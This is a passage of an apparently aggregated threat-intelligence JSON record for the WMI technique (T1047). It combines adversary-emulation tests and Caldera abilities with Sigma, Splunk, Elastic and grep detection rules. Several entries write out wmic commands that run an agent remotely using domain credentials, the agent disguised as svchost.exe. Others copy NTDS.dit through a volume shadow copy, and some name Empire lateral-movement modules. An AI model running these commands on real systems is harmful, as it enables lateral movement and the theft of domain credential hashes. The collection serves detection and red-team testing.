"wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit\"", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_wmi", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_wmi", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/wmi", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/wmi", "name": "Empire Module Command"}], "command_list": ["wmic useraccount get /ALL\n", "wmic process get caption,executablepath,commandline\n", "wmic qfe get description,installedOn /format:csv\n", "wmic /node:\"192.168.0.1\" service where (caption like \"%#{service_search_string} (%\")\n", "wmic /node:\"192.168.0.1\" service where (caption like \"%sql server (%\")\n", "wmic process call create calc.exe\n", "wmic /node:\"192.168.0.1\" process call create #{process_to_execute}\n", "wmic /node:\"192.168.0.1\" process call create calc.exe\n", {"windows": {"psh": {"command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, {"windows": {"psh": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh\";\n"}, "cmd": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd\";\n"}}}, {"windows": {"psh": {"cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"taskkill /f /im s4ndc4t.exe\"\n", "command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group} -executors psh\";\n"}}}, "wmic.exe /NODE:*process call create*", "wmic.exe /NODE:*path AntiVirusProduct get*", "wmic.exe /NODE:*path FirewallProduct get*", "WmiPrvSE.exe", "wmic.exe /NODE: \"192.168.0.1\" process call create \"*.exe\"", "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"at 9:00PM <path> ^> <path>\"", "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit\"", "powershell/lateral_movement/invoke_wmi", "powershell/lateral_movement/invoke_wmi", "powershell/persistence/elevated/wmi", "powershell/persistence/elevated/wmi"], "technique_id": "T1047", "parsed_datasets": [{"Atomic Red Team Test - Windows Management Instrumentation": {"display_name": "Windows Management Instrumentation", "atomic_tests": [{"description": "WMI List User Accounts\n", "supported_platforms": ["windows"], "name": "WMI Reconnaissance Users", "executor": {"elevation_required": false, "command": "wmic useraccount get /ALL\n", "name": "command_prompt"}}, {"description": "WMI List Processes\n", "supported_platforms": ["windows"], "name": "WMI Reconnaissance Processes", "executor": {"elevation_required": false, "command": "wmic process get caption,executablepath,commandline\n", "name": "command_prompt"}}, {"description": "WMI List Software\n", "supported_platforms": ["windows"], "name": "WMI Reconnaissance Software", "executor": {"elevation_required": false, "command": "wmic qfe get description,installedOn /format:csv\n", "name": "command_prompt"}}, {"description": "WMI List Remote Services\n", "supported_platforms": ["windows"], "name": "WMI Reconnaissance List Remote Services", "input_arguments": {"node": {"default": "192.168.0.1", "type": "String", "description": "Ip Address"}, "service_search_string": {"default": "sql server", "type": "String", "description": "Name Of Service"}}, "executor": {"elevation_required": false, "command": "wmic /node:\"#{node}\" service where (caption like \"%#{service_search_string} (%\")\n", "name": "command_prompt"}}, {"description": "This test uses wmic.exe to execute a process on the local host.\n", "supported_platforms": ["windows"], "name": "WMI Execute Local Process", "input_arguments": {"process_to_execute": {"default": "calc.exe", "type": "String", "description": "Name or path of process to execute."}}, "executor": {"elevation_required": false, "command": "wmic process call create #{process_to_execute}\n", "name": "command_prompt"}}, {"description": "This test uses wmic.exe to execute a process on a remote host.\n", "supported_platforms": ["windows"], "name": "WMI Execute Remote Process", "input_arguments": {"node": {"default": "192.168.0.1", "type": "String", "description": "Ip Address"}, "process_to_execute": {"default": "calc.exe", "type": "String", "description": "Name or path of process to execute."}}, "executor": {"elevation_required": false, "command": "wmic /node:\"#{node}\" process call create #{process_to_execute}\n", "name": "command_prompt"}}], "attack_technique": "T1047"}}, {"Mitre Stockpile - Capture process id, executable path, pid and parent pid before writing to disk": {"platforms": {"windows": {"psh": {"command": "wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"}}}, "description": "Capture process id, executable path, pid and parent pid before writing to disk", "tactic": "collection", "technique": {"attack_id": "T1047", "name": "WMIC"}, "id": "94f21386-9547-43c4-99df-938ab05d45ce", "name": "WMIC Process Enumeration"}}, {"Mitre Stockpile - Remotely executes 54ndc47 over WMI": {"platforms": {"windows": {"psh": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\svchost.exe -server #{server} -executors psh\";\n"}, "cmd": {"command": "wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create \"cmd.exe /c C:\\Users\\Public\\svchost.exe -server #{server} -executors cmd\";\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.basic": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}], "description": "Remotely executes 54ndc47 over WMI", "tactic": "execution", "technique": {"attack_id": "T1047", "name": "Windows Management Instrumentation"}, "id": "2a32e46f-5346-45d3-9475-52b857c05342", "name": "Start 54ndc47 (WMI)"}}, {"Mitre Stockpile - Remotely executes 54ndc47 over WMI": {"platforms": {"windows": {"psh": {"cleanup": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"taskkill /f /im s4ndc4t.exe\"\n", "command": "wmic /node:`\"#{remote.host.fqdn}`\" /user:#{domain.user.name} /password:#{domain.user.password} process call create \"powershell.exe C:\\Users\\Public\\s4ndc4t.exe -server #{server} -group #{group} -executors psh\";\n"}}}, "requirements": [{"plugins.stockpile.app.requirements.basic": [{"source": "domain.user.name", "edge": "has_password", "target": "domain.user.password"}]}, {"plugins.stockpile.app.requirements.basic": [{"source": "remote.host.fqdn", "edge": "has_54ndc47_copy"}]}, {"plugins.stockpile.app.requirements.no_backwards_movement": [{"source": "remote.host.fqdn"}]}], "description": "Remotely executes 54ndc47 over WMI", "tactic": "lateral-movement", "technique": {"attack_id": "T1047", "name": "Windows Management Instrumentation"}, "id": "ece5dde3-d370-4c20-b213-a1f424aa8d03", "name": "Start 54ndc47 (WMI)"}}, {"Threat Hunting Tables": {"mitre_attack": "T1047", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "f86c9d4c4b0afad1bb812fff0191b50c731760494ed45986e93b858daf386226", "chain_id": "100098", "registry_value": "", "mitre_caption": "wmi", "registry_path": "", "frequency": "rare", "commandline_string": "/NODE:*process call create*", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1047", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100099", "registry_value": "", "mitre_caption": "wmi", "registry_path": "", "frequency": "rare", "commandline_string": "/NODE:*path AntiVirusProduct get*", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1047", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100100", "registry_value": "", "mitre_caption": "wmi", "registry_path": "", "frequency": "rare", "commandline_string": "/NODE:*path FirewallProduct get*", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1047", "file_value": "", "file_path": "", "parent_process": "WmiPrvSE.exe", "itw_sample": "", "chain_id": "100102", "registry_value": "", "mitre_caption": "wmi", "registry_path": "", "frequency": "high", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1047", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100171", "registry_value": "", "mitre_caption": "execution", "registry_path": "", "frequency": "low", "commandline_string": "/NODE: \"192.168.0.1\" process call create \"*.exe\"", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1047", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100172", "registry_value": "", "mitre_caption": "execution", "registry_path": "", "frequency": "low", "commandline_string": "/node:REMOTECOMPUTERNAME PROCESS call create \"at 9:00PM <path> ^> <path>\"", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Threat Hunting Tables": {"mitre_attack": "T1047", "file_value": "", "file_path": "", "parent_process": "wmic.exe", "itw_sample": "", "chain_id": "100173", "registry_value": "", "mitre_caption": "execution", "registry_path": "", "frequency": "low", "commandline_string": "/node:REMOTECOMPUTERNAME PROCESS call create \"cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit\"", "loaded_dll": "", "os": "windows", "sub_process_1": "", "sub_process_2": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1047", "Empire Module": "powershell/lateral_movement/invoke_wmi", "Technique": "Windows Management Instrumentation", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_wmi\":  [\"T1047\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1047", "Empire Module": "powershell/persistence/elevated/wmi", "Technique": "Windows Management Instrumentation", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/elevated/wmi\":  [\"T1047\"],"}}], "queries": [{"query": "Sysmon| where EventID == 20 and wmi_consumer_type contains \"Command Line\"", "product": "Azure Sentinel", "name": "WMI Command Execution"}, {"query": "Sysmon| where EventID == 11 and process_command_line contains \"C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons.exe\"", "product": "Azure Sentinel", "name": "Windows Management Instrumentation Active Script Event Consumer FileAccess"}, {"query": "Sysmon| where EventID == 1 and (process_parent_command_line contains \"C:\\\\Windows\\\\System32\\\\svchost.exe\"or process_command_line contains \"C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons.exe\")", "product": "Azure Sentinel", "name": "Windows Management Instrumentation Active Script Event Consumer Process"}, {"query": "Sysmon| where EventID == 3 and (process_path contains \"wmic.exe\"or process_command_line contains \"wmic\")", "product": "Azure Sentinel", "name": "Windows Management Instrumentation Network"}, {"query": "Sysmon| where EventID == 1 and (process_parent_command_line contains \"wmiprvse.exe\"or process_path contains \"wmic.exe\"or process_command_line contains \"wmic\")", "product": "Azure Sentinel", "name": "Windows Management Instrumentation Process"}, {"query": "title: SquiblyTwo\nid: 8d63dadf-b91b-4187-87b6-34a1114577ea\nstatus: experimental\ndescription: Detects WMI SquiblyTwo Attack with possible renamed WMI by looking for imphash\nreferences:\n    - https://subt0x11.blogspot.ch/2018/04/wmicexe-whitelisting-bypass-hacking.html\n    - https://twitter.com/mattifestation/status/986280382042595328\ntags:\n    - attack.defense_evasion\n    - attack.t1047\nauthor: Markus Neis / Florian Roth\nfalsepositives:\n    - Unknown\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image:\n            - '*\\wmic.exe'\n        CommandLine:\n            - wmic * *format:\\\"http*\n            - wmic * /format:'http\n            - wmic * /format:http*\n    selection2:\n        Imphash:\n            - 1B1A3F43BF37B5BFE60751F2EE2F326E\n            - 37777A96245A3C74EB217308F3546F4C\n            - 9D87C9D67CE724033C0B40CC4CA1B206\n        CommandLine:\n            - '* *format:\\\"http*'\n            - '* /format:''http'\n            - '* /format:http*'\n    condition: 1 of them", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: SquiblyTwo\nid: 8d63dadf-b91b-4187-87b6-34a1114577ea\nstatus: experimental\ndescription: Detects WMI SquiblyTwo Attack with possible renamed WMI by looking for imphash\nreferences:\n    - https://subt0x11.blogspot.ch/2018/04/wmicexe-whitelisting-bypass-hacking.html\n    - https://twitter.com/mattifestation/status/986280382042595328\ntags:\n    - attack.defense_evasion\n    - attack.t1047\nauthor: Markus Neis / Florian Roth\nfalsepositives:\n    - Unknown\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Image:\n            - '*\\wmic.exe'\n        CommandLine:\n            - wmic * *format:\\\"http*\n            - wmic * /format:'http\n            - wmic * /format:http*\n    selection2:\n        Imphash:\n            - 1B1A3F43BF37B5BFE60751F2EE2F326E\n            - 37777A96245A3C74EB217308F3546F4C\n            - 9D87C9D67CE724033C0B40CC4CA1B206\n        CommandLine:\n            - '* *format:\\\"http*'\n            - '* /format:''http'\n            - '* /format:http*'\n    condition: 1 of them", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:(*\\\\\\\\wmic.exe) AND CommandLine.keyword:(wmic\\\\ *\\\\ *format\\\\:\\\\\\\\\\\\\"http* OR wmic\\\\ *\\\\ \\\\/format\\\\:\\'http OR wmic\\\\ *\\\\ \\\\/format\\\\:http*)) OR (Imphash:(\"1B1A3F43BF37B5BFE60751F2EE2F326E\" OR \"37777A96245A3C74EB217308F3546F4C\" OR \"9D87C9D67CE724033C0B40CC4CA1B206\") AND CommandLine.keyword:(*\\\\ *format\\\\:\\\\\\\\\\\\\"http* OR *\\\\ \\\\/format\\\\:\\'http OR *\\\\ \\\\/format\\\\:http*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/SquiblyTwo <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"SquiblyTwo\",\\n    \"description\": \"Detects WMI SquiblyTwo Attack with possible renamed WMI by looking for imphash\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1047\"\\n    ],\\n    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\wmic.exe) AND CommandLine.keyword:(wmic\\\\\\\\ *\\\\\\\\ *format\\\\\\\\:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"http* OR wmic\\\\\\\\ *\\\\\\\\ \\\\\\\\/format\\\\\\\\:\\'http OR wmic\\\\\\\\ *\\\\\\\\ \\\\\\\\/format\\\\\\\\:http*)) OR (Imphash:(\\\\\"1B1A3F43BF37B5BFE60751F2EE2F326E\\\\\" OR \\\\\"37777A96245A3C74EB217308F3546F4C\\\\\" OR \\\\\"9D87C9D67CE724033C0B40CC4CA1B206\\\\\") AND CommandLine.keyword:(*\\\\\\\\ *format\\\\\\\\:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"http* OR *\\\\\\\\ \\\\\\\\/format\\\\\\\\:\\'http OR *\\\\\\\\ \\\\\\\\/format\\\\\\\\:http*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\wmic.exe) AND CommandLine.keyword:(wmic\\\\\\\\ *\\\\\\\\ *format\\\\\\\\:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"http* OR wmic\\\\\\\\ *\\\\\\\\ \\\\\\\\/format\\\\\\\\:\\'http OR wmic\\\\\\\\ *\\\\\\\\ \\\\\\\\/format\\\\\\\\:http*)) OR (Imphash:(\\\\\"1B1A3F43BF37B5BFE60751F2EE2F326E\\\\\" OR \\\\\"37777A96245A3C74EB217308F3546F4C\\\\\" OR \\\\\"9D87C9D67CE724033C0B40CC4CA1B206\\\\\") AND CommandLine.keyword:(*\\\\\\\\ *format\\\\\\\\:\\\\\\\\\\\\\\\\\\\\\\\\\\\\\"http* OR *\\\\\\\\ \\\\\\\\/format\\\\\\\\:\\'http OR *\\\\\\\\ \\\\\\\\/format\\\\\\\\:http*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'SquiblyTwo\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:(*\\\\\\\\wmic.exe) AND CommandLine.keyword:(wmic * *format\\\\:\\\\\\\\\\\\\"http* wmic * \\\\/format\\\\:\\'http wmic * \\\\/format\\\\:http*)) OR (Imphash:(\"1B1A3F43BF37B5BFE60751F2EE2F326E\" \"37777A96245A3C74EB217308F3546F4C\" \"9D87C9D67CE724033C0B40CC4CA1B206\") AND CommandLine.keyword:(* *format\\\\:\\\\\\\\\\\\\"http* * \\\\/format\\\\:\\'http * \\\\/format\\\\:http*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((Image=\"*\\\\\\\\wmic.exe\") (CommandLine=\"wmic * *format:\\\\\\\\\\\\\"http*\" OR CommandLine=\"wmic * /format:\\'http\" OR CommandLine=\"wmic * /format:http*\")) OR ((Imphash=\"1B1A3F43BF37B5BFE60751F2EE2F326E\" OR Imphash=\"37777A96245A3C74EB217308F3546F4C\" OR Imphash=\"9D87C9D67CE724033C0B40CC4CA1B206\") (CommandLine=\"* *format:\\\\\\\\\\\\\"http*\" OR CommandLine=\"* /format:\\'http\" OR CommandLine=\"* /format:http*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image IN [\"*\\\\\\\\wmic.exe\"] CommandLine IN [\"wmic * *format:\\\\\\\\\\\\\"http*\", \"wmic * /format:\\'http\", \"wmic * /format:http*\"]) OR (Imphash IN [\"1B1A3F43BF37B5BFE60751F2EE2F326E\", \"37777A96245A3C74EB217308F3546F4C\", \"9D87C9D67CE724033C0B40CC4CA1B206\"] CommandLine IN [\"* *format:\\\\\\\\\\\\\"http*\", \"* /format:\\'http\", \"* /format:http*\"])))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P \\'^(?:.*(?:.*(?:.*(?=.*(?:.*.*\\\\wmic\\\\.exe))(?=.*(?:.*wmic .* .*format:\\\\\"http.*|.*wmic .* /format:\\'\"\\'\"\\'http|.*wmic .* /format:http.*)))|.*(?:.*(?=.*(?:.*1B1A3F43BF37B5BFE60751F2EE2F326E|.*37777A96245A3C74EB217308F3546F4C|.*9D87C9D67CE724033C0B40CC4CA1B206))(?=.*(?:.*.* .*format:\\\\\"http.*|.*.* /format:\\'\"\\'\"\\'http|.*.* /format:http.*)))))\\'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious WMI execution\nid: 526be59f-a573-4eea-b5f7-f0973207634d\nstatus: experimental\ndescription: Detects WMI executing suspicious commands\nreferences:\n    - https://digital-forensics.sans.org/blog/2010/06/04/wmic-draft/\n    - https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1\n    - https://blog.malwarebytes.com/threat-analysis/2016/04/rokku-ransomware/\nauthor: Michael Haag, Florian Roth, juju4\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\wmic.exe'\n        CommandLine:\n            - '*/NODE:*process call create *'\n            - '* path AntiVirusProduct get *'\n            - '* path FirewallProduct get *'\n            - '* shadowcopy delete *'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nfalsepositives:\n    - Will need to be tuned\n    - If using Splunk, I recommend | stats count by Computer,CommandLine following for easy hunting by Computer/CommandLine.\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious WMI execution\nid: 526be59f-a573-4eea-b5f7-f0973207634d\nstatus: experimental\ndescription: Detects WMI executing suspicious commands\nreferences:\n    - https://digital-forensics.sans.org/blog/2010/06/04/wmic-draft/\n    - https://www.hybrid-analysis.com/sample/4be06ecd234e2110bd615649fe4a6fa95403979acf889d7e45a78985eb50acf9?environmentId=1\n    - https://blog.malwarebytes.com/threat-analysis/2016/04/rokku-ransomware/\nauthor: Michael Haag, Florian Roth, juju4\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\wmic.exe'\n        CommandLine:\n            - '*/NODE:*process call create *'\n            - '* path AntiVirusProduct get *'\n            - '* path FirewallProduct get *'\n            - '* shadowcopy delete *'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\ntags:\n    - attack.execution\n    - attack.t1047\n    - car.2016-03-002\nfalsepositives:\n    - Will need to be tuned\n    - If using Splunk, I recommend | stats count by Computer,CommandLine following for easy hunting by Computer/CommandLine.\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\wmic.exe) AND CommandLine.keyword:(*\\\\/NODE\\\\:*process\\\\ call\\\\ create\\\\ * OR *\\\\ path\\\\ AntiVirusProduct\\\\ get\\\\ * OR *\\\\ path\\\\ FirewallProduct\\\\ get\\\\ * OR *\\\\ shadowcopy\\\\ delete\\\\ *))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-WMI-execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious WMI execution\",\\n    \"description\": \"Detects WMI executing suspicious commands\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1047\",\\n      \"car.2016-03-002\"\\n    ],\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\wmic.exe) AND CommandLine.keyword:(*\\\\\\\\/NODE\\\\\\\\:*process\\\\\\\\ call\\\\\\\\ create\\\\\\\\ * OR *\\\\\\\\ path\\\\\\\\ AntiVirusProduct\\\\\\\\ get\\\\\\\\ * OR *\\\\\\\\ path\\\\\\\\ FirewallProduct\\\\\\\\ get\\\\\\\\ * OR *\\\\\\\\ shadowcopy\\\\\\\\ delete\\\\\\\\ *))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\wmic.exe) AND CommandLine.keyword:(*\\\\\\\\/NODE\\\\\\\\:*process\\\\\\\\ call\\\\\\\\ create\\\\\\\\ * OR *\\\\\\\\ path\\\\\\\\ AntiVirusProduct\\\\\\\\ get\\\\\\\\ * OR *\\\\\\\\ path\\\\\\\\ FirewallProduct\\\\\\\\ get\\\\\\\\ * OR *\\\\\\\\ shadowcopy\\\\\\\\ delete\\\\\\\\ *))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious WMI execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\wmic.exe) AND CommandLine.keyword:(*\\\\/NODE\\\\:*process call create * * path AntiVirusProduct get * * path FirewallProduct get * * shadowcopy delete *))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\wmic.exe\") (CommandLine=\"*/NODE:*process call create *\" OR CommandLine=\"* path AntiVirusProduct get *\" OR CommandLine=\"* path FirewallProduct get *\" OR CommandLine=\"* shadowcopy delete *\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\wmic.exe\"] CommandLine IN [\"*/NODE:*process call create *\", \"* path AntiVirusProduct get *\", \"* path FirewallProduct get *\", \"* shadowcopy delete *\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\wmic\\\\.exe))(?=.*(?:.*.*/NODE:.*process call create .*|.*.* path AntiVirusProduct get .*|.*.* path FirewallProduct get .*|.*.* shadowcopy delete .*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Login with WMI\nid: 5af54681-df95-4c26-854f-2565e13cfab0\nstatus: stable\ndescription: Detection of logins performed with WMI\nauthor: Thomas Patzke\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        ProcessName: \"*\\\\WmiPrvSE.exe\"\n    condition: selection\nfalsepositives:\n    - Monitoring tools\n    - Legitimate system administration\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Login with WMI\nid: 5af54681-df95-4c26-854f-2565e13cfab0\nstatus: stable\ndescription: Detection of logins performed with WMI\nauthor: Thomas Patzke\ntags:\n    - attack.execution\n    - attack.t1047\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        ProcessName: \"*\\\\WmiPrvSE.exe\"\n    condition: selection\nfalsepositives:\n    - Monitoring tools\n    - Legitimate system administration\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4624\" AND ProcessName.keyword:*\\\\\\\\WmiPrvSE.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Login-with-WMI <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Login with WMI\",\\n    \"description\": \"Detection of logins performed with WMI\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1047\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4624\\\\\" AND ProcessName.keyword:*\\\\\\\\\\\\\\\\WmiPrvSE.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4624\\\\\" AND ProcessName.keyword:*\\\\\\\\\\\\\\\\WmiPrvSE.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Login with WMI\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      